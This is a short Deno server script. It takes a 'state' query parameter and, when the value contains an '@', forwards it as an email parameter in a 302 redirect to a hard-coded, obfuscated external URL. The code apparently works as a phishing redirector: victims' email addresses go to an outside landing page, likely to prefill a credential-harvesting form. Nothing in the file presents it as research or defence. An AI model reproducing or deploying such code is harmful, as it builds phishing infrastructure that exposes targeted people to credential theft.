const PORT = Number(Deno.env.get("PORT") || 8080);

const DESTINATION = "https://4i5qg62nsevh3ep5ue2ka2j3ysnpigq2jxlqhh2v4pwdvtije5qq.turbo-gateway.com/4jsDe02RKn2R_aE0oGk7xJr0GhpN1wOfVePsOs0JJ2E";

Deno.serve({ port: PORT }, (req) => {
  const url = new URL(req.url);
  const state = url.searchParams.get("state");

  let target = DESTINATION;
  if (state && state.includes("@")) {
    const params = new URLSearchParams({ e: state });
    target += `?${params.toString()}`;
  }

  return Response.redirect(target, 302);
});
